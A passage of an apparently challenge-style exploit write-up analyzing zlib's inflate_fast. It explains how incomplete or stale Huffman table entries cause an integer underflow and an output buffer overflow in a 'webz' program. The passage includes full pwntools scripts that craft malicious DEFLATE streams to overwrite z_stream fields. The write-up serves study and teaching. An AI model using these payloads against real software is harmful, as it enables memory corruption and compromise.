    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;It loops until the preconditions fail. At the start of each iteration, if fewer than 15 bits are available in &lt;code&gt;hold&lt;/code&gt;, it preloads 16 bits. This reduces overhead in the inner loop.&lt;/p&gt;&lt;code&gt;        here = lcode + (hold &amp;amp; lmask);
      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
        }
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }&lt;/code&gt;&lt;p&gt;The logic mirrors &lt;code&gt;inflate.c&lt;/code&gt;: look up a &lt;code&gt;code&lt;/code&gt; in &lt;code&gt;lcode&lt;/code&gt;. If it’s a literal, emit it and continue; if it’s a length, decode the length and then decode the distance next, preloading more bits first.&lt;/p&gt;&lt;code&gt;            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;Distance decoding follows. After that, the LZ77 copy routine (not shown here) copies bytes from the window; the code is messy because it optimizes for various cases.&lt;/p&gt;&lt;code&gt;            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }
            else {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }
        }
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }
        else if (op &amp;amp; 32) {                     /* end-of-block */
            Tracevv((stderr, "inflate:         end of block\n"));
            state-&amp;gt;mode = TYPE;
            break;
        }
        else {
            strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
            state-&amp;gt;mode = BAD;
            break;
        }&lt;/code&gt;&lt;p&gt;After the LZ77 copy, the code handles second-level table lookups and invalid codes.&lt;/p&gt;&lt;p&gt;We analyzed the principal parts of &lt;code&gt;Inflate&lt;/code&gt;, the decoder for &lt;code&gt;Deflate&lt;/code&gt;. Do you see the bug? Everything looks well designed.&lt;/p&gt;&lt;p&gt;There’s a subtle issue in the Huffman table construction. A Huffman table can be incomplete. For example, if &lt;code&gt;root&lt;/code&gt; is 8 and the maximum code length is 10, there will be no entries for length‑9 codes; i.e., some table entries remain unset. Are such NULL entries handled correctly during decoding?&lt;/p&gt;&lt;code&gt;// inflate.c
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
...
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }

// inftrees.c
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }&lt;/code&gt;&lt;p&gt;No. As we’ve seen, incomplete entries should be filled with &lt;code&gt;op=64&lt;/code&gt; (invalid).&lt;/p&gt;&lt;p&gt;As a result, any NULL entries get treated as if they were &lt;code&gt;code&lt;/code&gt; structures with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. Or, they may retain stale values from a previous block.&lt;/p&gt;&lt;p&gt;To achieve high speed, &lt;code&gt;inflate_fast&lt;/code&gt; omits many checks; it can therefore cause memory corruption when encountering incomplete Huffman tables. Let’s explore how.&lt;/p&gt;&lt;p&gt;The first memory bug identified was an integer overflow, but it wasn’t exploitable. The second was a stream overflow, which we ultimately exploited. We’ll describe both.&lt;/p&gt;&lt;p&gt;Let’s see what happens when a zero‑initialized table entry (&lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;) is used in decoding.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
        }&lt;/code&gt;&lt;p&gt;In the literal path, a &lt;code&gt;code&lt;/code&gt; with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt; consumes zero bits and decodes a null byte. Since no bits are consumed, &lt;code&gt;inflate_fast&lt;/code&gt; would loop forever decoding that same entry.&lt;/p&gt;&lt;code&gt;    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;However, the loop is bounded by &lt;code&gt;out &amp;lt; end&lt;/code&gt;, so no overflow occurs here.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        ...
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            ...
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }&lt;/code&gt;&lt;p&gt;What about the length path? Because of the &lt;code&gt;op&lt;/code&gt; checks, the code falls into the second-level table lookup. With zero bits consumed, it indexes the 0th entry again.&lt;/p&gt;&lt;code&gt;          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
            ....
            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }&lt;/code&gt;&lt;p&gt;Distance decoding behaves similarly, but worse: the second-level lookup jumps back into the distance decode path. The “0th table entry” behavior is dangerous, because the second-level lookup is designed to read a sub-table (with smaller &lt;code&gt;bits&lt;/code&gt;), but instead it’s indexing the primary table. &lt;code&gt;inflate_fast&lt;/code&gt; keeps at least 16 bits in &lt;code&gt;hold&lt;/code&gt; and assumes no codes exceed 15 bits, so it omits checks. The erroneous “0th entry” lookup breaks this assumption.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Why are Huffman codes guaranteed ≤15 bits? Because the Code Huffman table itself can only encode lengths up to 15; longer lengths cannot be represented.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Consider:&lt;/p&gt;&lt;code&gt;Bit buffer size: 16 (minimum present)
Primary table root: 10
Maximum Huffman code length: 12

1. Normal second-level distance lookup -&amp;gt; uninitialized entry `op=0, bits=0, val=0` (bits: 16 - 10 = 6)
2. Abnormal second-level lookup -&amp;gt; 0th primary-table entry (bits: 6 - 0 = 6)
3. Decoding the 0th primary-table entry (bits: 6 - 10 = -2)&lt;/code&gt;&lt;p&gt;As noted, the distance path jumps back into distance decoding after the second-level lookup, so the primary table (not sub-table) is indexed next, consuming too many bits. Ultimately, the &lt;code&gt;bits&lt;/code&gt; counter underflows—an integer overflow.&lt;/p&gt;&lt;code&gt;    /* return unused bytes (on entry, bits &amp;lt; 8, so in won't go too far back) */
    len = bits &amp;gt;&amp;gt; 3;
    in -= len;
    bits -= len &amp;lt;&amp;lt; 3;
    hold &amp;amp;= (1U &amp;lt;&amp;lt; bits) - 1;

    /* update state and return */
    strm-&amp;gt;next_in = in;
    strm-&amp;gt;next_out = out;
    strm-&amp;gt;avail_in = (unsigned)(in &amp;lt; last ? 5 + (last - in) : 5 - (in - last));
    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));
    state-&amp;gt;hold = hold;
    state-&amp;gt;bits = bits;
    return;&lt;/code&gt;&lt;p&gt;At the end of &lt;code&gt;inflate_fast&lt;/code&gt;, the code adjusts &lt;code&gt;in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; by the number of unused bits. Thus, the integer overflow in &lt;code&gt;bits&lt;/code&gt; corrupts &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; and &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;, affecting subsequent decoding.&lt;/p&gt;&lt;code&gt;import struct

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)


stream = BitStream()

# "AABCABC" -&amp;gt; 'A', 'A', 'B', 'C', (L=3, D=3), EOB
symbol_stream = [
    ('LIT', 65), ('LIT', 65), ('LIT', 66), ('LIT', 67),
    ('LD', (3, 3))
]

symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))

symbol_stream.append(('EOB', 256))

for i in range(0,0x200):
    symbol_stream.append(('LIT', 65))

ll_lengths = [0] * 286
ll_lengths[65] = 15  # 'A'
ll_lengths[66] = 15  # 'B'
ll_lengths[67] = 15  # 'C'
ll_lengths[68] = 15  # 'D'
ll_lengths[69] = 15  # 'E'
ll_lengths[256] = 15 # EOB
ll_lengths[257] = 15 # Length 3

dist_lengths = [0] * 30
dist_lengths[2] = 10 # Distance 3
dist_lengths[3] = 10 # Distance 4
dist_lengths[4] = 12 # Distance 5

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
payload = stream.get_bytes()

print(f"Generated DEFLATE payload ({len(payload)} bytes):")
print(payload.hex())

from pwn import *

p = process("./src/webz_asan")

def send_webz_payload(pay):
    MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+MAX_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

send_webz_payload(payload)

p.interactive()&lt;/code&gt;&lt;p&gt;We reproduce the case described above. The Distance table has &lt;code&gt;root=10&lt;/code&gt; with a maximum code length of 12, so there are unfilled entries with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. By crafting the stream to force a multilevel lookup, we can trigger the vulnerability.&lt;/p&gt;&lt;code&gt;    symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
    symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))&lt;/code&gt;&lt;p&gt;These are key. The first is a valid 15‑bit length code. The second is an invalid 12‑bit distance code.&lt;/p&gt;&lt;code&gt;dist_lengths[4] = 12 # Distance 5&lt;/code&gt;&lt;p&gt;The valid distance‑5 code is &lt;code&gt;000000001000&lt;/code&gt;. Instead, &lt;code&gt;000000001001&lt;/code&gt; forces a second‑level lookup that reads an uninitialized &lt;code&gt;code&lt;/code&gt; entry.&lt;/p&gt;&lt;p&gt;As a result, &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; are corrupted.&lt;/p&gt;&lt;p&gt;However, this particular memory corruption was not exploitable. If we first decompress dummy data in block one, and then in a second block trigger the bug with a Literal/Length table that only contains EOB, we can corrupt &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; without crashing. But since these are input stream variables (not output buffer variables), we couldn’t achieve an overflow or OOB write on the decompressed output buffer.&lt;/p&gt;&lt;p&gt;So what should we target to exploit uninitialized table entries? The most promising avenue in zlib is to abuse the copy routines. The stored-block copy and the LZ77 copy are powerful overwrite primitives—if we can disable the checks that constrain them.&lt;/p&gt;&lt;p&gt;In other words, we need to corrupt &lt;code&gt;avail_out&lt;/code&gt;, not &lt;code&gt;avail_in&lt;/code&gt;. Let’s inspect &lt;code&gt;inflate_fast&lt;/code&gt;’s LZ77 decode.&lt;/p&gt;&lt;code&gt;        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }
            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;The LZ77 decode in &lt;code&gt;inflate_fast&lt;/code&gt; has almost no checks. The only guard is &lt;code&gt;if (dist &amp;gt; dmax)&lt;/code&gt;, behind &lt;code&gt;INFLATE_STRICT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;How can it still be safe?&lt;/p&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};&lt;/code&gt;&lt;p&gt;The maximum copy length (LZ77 length) is &lt;code&gt;lbase[28] (258) + ((lext[28] (16) &amp;amp; 15) == 0)&lt;/code&gt; → 258. Earlier we noted that &lt;code&gt;inflate_fast&lt;/code&gt; is entered only when &lt;code&gt;strm-&amp;gt;avail_out &amp;gt;= 258&lt;/code&gt;, and the loop exits as soon as that’s no longer true. Thus, &lt;code&gt;inflate_fast&lt;/code&gt; can safely omit length checks because it guarantees there are at least 258 bytes of space.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);&lt;/code&gt;&lt;p&gt;In &lt;code&gt;inflate&lt;/code&gt;, tables are written into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, which is not cleared between blocks. The tables’ boundaries aren’t fixed either; &lt;code&gt;state-&amp;gt;next&lt;/code&gt; advances dynamically, so different blocks can lay out different tables at different offsets.&lt;/p&gt;&lt;p&gt;Therefore, stale entries from a previous block can persist in uninitialized slots of later tables—even of different types.&lt;/p&gt;&lt;p&gt;If a Distance-table entry from a previous block remains in an uninitialized slot of the subsequent Literal/Length table, we’re in trouble. Deflate limits lengths to 258, but distances can be much larger. If a stale Distance entry is misinterpreted as a Length entry in &lt;code&gt;inflate_fast&lt;/code&gt;, its length can exceed 258, breaking the invariant that made &lt;code&gt;inflate_fast&lt;/code&gt; safe.&lt;/p&gt;&lt;code&gt;    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));&lt;/code&gt;&lt;p&gt;Ultimately, when the LZ77 decode interprets a stale Distance entry as a Length, &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; suffers an integer overflow. Unlike &lt;code&gt;avail_in&lt;/code&gt;, &lt;code&gt;avail_out&lt;/code&gt; reflects the remaining size of the output buffer, so this immediately leads to a buffer overflow.&lt;/p&gt;&lt;code&gt;#define MAX_INPUT_SIZE 4096
#define MAX_OUTPUT_SIZE (MAX_INPUT_SIZE * 2)

typedef struct EncodedWebz {
    uint8_t data[MAX_INPUT_SIZE];
    size_t size;
} EncodedWebz;

typedef struct DecodedWebz {
    uint8_t data[MAX_OUTPUT_SIZE];
    size_t size;
} DecodedWebz;

typedef struct WebzState {
    EncodedWebz encoded;
    DecodedWebz decoded;
    z_stream infstream;
    char ok_status[5];
} WebzState;

WebzState webz_state;&lt;/code&gt;&lt;p&gt;The decompressed bytes are written into the global &lt;code&gt;webz_state&lt;/code&gt; in &lt;code&gt;webz.c&lt;/code&gt;. To actually corrupt memory, we must write more than &lt;code&gt;8192&lt;/code&gt; bytes and overflow into the following &lt;code&gt;z_stream infstream&lt;/code&gt;, overwriting its fields.&lt;/p&gt;&lt;code&gt;stream = BitStream()

# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================

"""
0x000064f4b0253370│+0x0000: 0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253378│+0x0008: 0x0000000000000000
0x000064f4b0253380│+0x0010: 0x0000000000000472
0x000064f4b0253388│+0x0018: 0x000064f4b0253370  →  0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253390│+0x0020: 0x00000000ffffe304  →  0x0000000000000000
0x000064f4b0253398│+0x0028: 0x0000000000002008
0x000064f4b02533a0│+0x0030: 0x000064f4b02533e0  →  0x0000000000000000
0x000064f4b02533a8│+0x0038: 0x0000000000000000
0x000064f4b02533b0│+0x0040: 0x000064f4af885820  →  &amp;lt;webz_alloc+0000&amp;gt; push rbp
0x000064f4b02533b8│+0x0048: 0x000064f4af8a3390  →  &amp;lt;zcfree+0000&amp;gt; push rbp
0x000064f4b02533c0│+0x0050: 0x0000000000000000
0x000064f4b02533c8│+0x0058: 0x0000000000000040 ("@"?)
"""

payload = stream.get_bytes()
print(f"Generated DEFLATE payload ({len(payload)} bytes):")

p = process("./webz")
#p = process("./src/webz_asan")

def send_webz_payload(pay):
    #MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

raw_input()
send_webz_payload(payload)

